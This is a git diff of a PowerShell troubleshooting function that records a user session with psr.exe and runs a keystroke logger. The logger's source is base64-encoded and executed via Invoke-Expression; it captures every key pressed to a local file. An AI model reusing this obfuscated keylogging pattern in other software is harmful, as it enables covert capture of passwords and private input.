@@ -18,9 +18,7 @@ function Trace-vtsSession {
         $SessionStart = Get-Date -Format 'h:mm:ss tt'
         $timestamp = Get-Date -format yyyy-MM-dd-HH-mm-ss-ff
         $dir = "C:\Windows\TEMP\VTS\PSDOCS\$timestamp"
-
-        function ShowTitle {
-            $title = @'
+        $title = @'
                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
@@ -41,19 +39,12 @@ function Trace-vtsSession {
                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣖⣤⣶⣼⣿⣿⣿⣿⣿⣿⣷⣾⣿⡿⣿⠷⡊⠁⢠⣅⠀⠀⠀⢀⣴⣿⣎⠻⠋⠁  
                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠋⠉⠛⠙⠛⠛⠛⠛⠋⠋⠑⠉⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻
 '@
-            Clear-Host
-            Write-Host $title -ForegroundColor DarkGreen
-        }
-        ShowTitle
+        Clear-Host
+        Write-Host $title -ForegroundColor DarkGreen
     
-        function PromptForDescription {
-            $script:issue = Read-Host "Enter a short description of the issue"
-        }
+        $issue = Read-Host "Enter a short description of the issue"
         
-        PromptForDescription
-        
-        function ShowRecording {
-            $rec = @"
+        $rec = @"
 
 ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
@@ -63,29 +54,26 @@ function Trace-vtsSession {
 ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
 
 "@
-            Clear-Host
-            Write-Host $rec -ForegroundColor Red
-            Write-Host "Press Ctrl-C when finished.`n" -ForegroundColor Yellow
-        }
-
-        ShowRecording
-
+        Clear-Host
+        Write-Host $rec -ForegroundColor Red
+        Write-Host "Press Ctrl-C when finished.`n" -ForegroundColor Yellow
+        
         While ($true) {
+
+            # Define Funtions
 
             $KeyLoggerBase64 = "ZnVuY3Rpb24gU3RhcnQtS2V5TG9nZ2VyKCRQYXRoID0gIiRkaXJca2V5bG9nZ2VyLnR4dCIpIHsKICAgICMgcmVjb3JkcyBhbGwga2V5IHByZXNzZXMgdW50aWwgc2NyaXB0IGlzIGFib3J0ZWQKCiAgICAjIFNpZ25hdHVyZXMgZm9yIEFQSSBDYWxscwogICAgJHNpZ25hdHVyZXMgPSBAIgpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8sIEV4YWN0U3BlbGxpbmc9dHJ1ZSldIApwdWJsaWMgc3RhdGljIGV4dGVybiBzaG9ydCBHZXRBc3luY0tleVN0YXRlKGludCB2aXJ0dWFsS2V5Q29kZSk7IApbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0S2V5Ym9hcmRTdGF0ZShieXRlW10ga2V5c3RhdGUpOwpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgTWFwVmlydHVhbEtleSh1aW50IHVDb2RlLCBpbnQgdU1hcFR5cGUpOwpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgVG9Vbmljb2RlKHVpbnQgd1ZpcnRLZXksIHVpbnQgd1NjYW5Db2RlLCBieXRlW10gbHBrZXlzdGF0ZSwgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlciBwd3N6QnVmZiwgaW50IGNjaEJ1ZmYsIHVpbnQgd0ZsYWdzKTsKIkAKCiMgbG9hZCBzaWduYXR1cmVzIGFuZCBtYWtlIG1lbWJlcnMgYXZhaWxhYmxlCiRBUEkgPSBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkc2lnbmF0dXJlcyAtTmFtZSAnV2luMzInIC1OYW1lc3BhY2UgQVBJIC1QYXNzVGhydQoKIyBjcmVhdGUgb3V0cHV0IGZpbGUKJG51bGwgPSBOZXctSXRlbSAtUGF0aCAkUGF0aCAtSXRlbVR5cGUgRmlsZSAtRm9yY2UKCiMgQ3JlYXRlcyBsb29wIHRoYXQgZXhpdHMgd2hlbiBQU1IgaXMgbm8gbG9uZ2VyIHJ1bm5pbmcuCndoaWxlIChnZXQtcHJvY2VzcyBwc3IpIHsKICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAgIzIwICM0MAoKICAgICMgc2NhbiBhbGwgQVNDSUkgY29kZXMgYWJvdmUgOAogICAgZm9yICgkYXNjaWkgPSA5OyAkYXNjaWkgLWxlIDI1NDsgJGFzY2lpKyspIHsKICAgICAgICAjIGdldCBjdXJyZW50IGtleSBzdGF0ZQogICAgICAgICRzdGF0ZSA9ICRBUEk6OkdldEFzeW5jS2V5U3RhdGUoJGFzY2lpKQoKICAgICAgICAjIGlzIGtleSBwcmVzc2VkPwogICAgICAgIGlmICgkc3RhdGUgLWVxIC0zMjc2NykgewogICAgICAgICAgICAkbnVsbCA9IFtjb25zb2xlXTo6Q2Fwc0xvY2sKCiAgICAgICAgICAgICMgdHJhbnNsYXRlIHNjYW4gY29kZSB0byByZWFsIGNvZGUKICAgICAgICAgICAgJHZpcnR1YWxLZXkgPSAkQVBJOjpNYXBWaXJ0dWFsS2V5KCRhc2NpaSwgMykKCiAgICAgICAgICAgICMgZ2V0IGtleWJvYXJkIHN0YXRlIGZvciB2aXJ0dWFsIGtleXMKICAgICAgICAgICAgJGtic3RhdGUgPSBOZXctT2JqZWN0IEJ5dGVbXSAyNTYKICAgICAgICAgICAgJGNoZWNra2JzdGF0ZSA9ICRBUEk6OkdldEtleWJvYXJkU3RhdGUoJGtic3RhdGUpCgogICAgICAgICAgICAjIHByZXBhcmUgYSBTdHJpbmdCdWlsZGVyIHRvIHJlY2VpdmUgaW5wdXQga2V5CiAgICAgICAgICAgICRteWNoYXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyCgogICAgICAgICAgICAjIHRyYW5zbGF0ZSB2aXJ0dWFsIGtleQogICAgICAgICAgICAkc3VjY2VzcyA9ICRBUEk6OlRvVW5pY29kZSgkYXNjaWksICR2aXJ0dWFsS2V5LCAka2JzdGF0ZSwgJG15Y2hhciwgJG15Y2hhci5DYXBhY2l0eSwgMCkKCiAgICAgICAgICAgIGlmICgkc3VjY2VzcykgewogICAgICAgICAgICAgICAgIyBhZGQga2V5IHRvIGxvZ2dlciBmaWxlCiAgICAgICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpBcHBlbmRBbGxUZXh0KCRQYXRoLCAkbXljaGFyLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlKSAKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKfQ=="
             $Bytes = [System.Convert]::FromBase64String($KeyLoggerBase64)
             Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString($Bytes) )
-            
             # Create $path directory if it doesn't exist
             if (-not (Test-Path $dir)) { mkdir $dir | Out-Null }
 
 
             # Start PSR
             psr.exe /start /output "$dir\problem_steps_record-$($timestamp).zip" /gui 0 #  /sc 1 #/maxsc 100
-        
-        #The Start-Keylogger function is defined within the $KeyLoggerBase64 variable
-        Start-Keylogger
-
+            
+            # Start Keylogger
+            Start-KeyLogger
         }
     }
     finally {
@@ -136,7 +124,7 @@ function Trace-vtsSession {
         $content = Get-Content $inputFile
 
         # Function to determine if a character is valid UTF-8 and not a control character, excluding line breaks
-        function Test-ValidUTF8AndNotControlChar($char) {
+        function Is-ValidUTF8AndNotControlChar($char) {
             try {
                 $isControlChar = [Char]::IsControl($char)
                 if ($isControlChar -and $char -ne "`r" -and $char -ne "`n") { return $false }
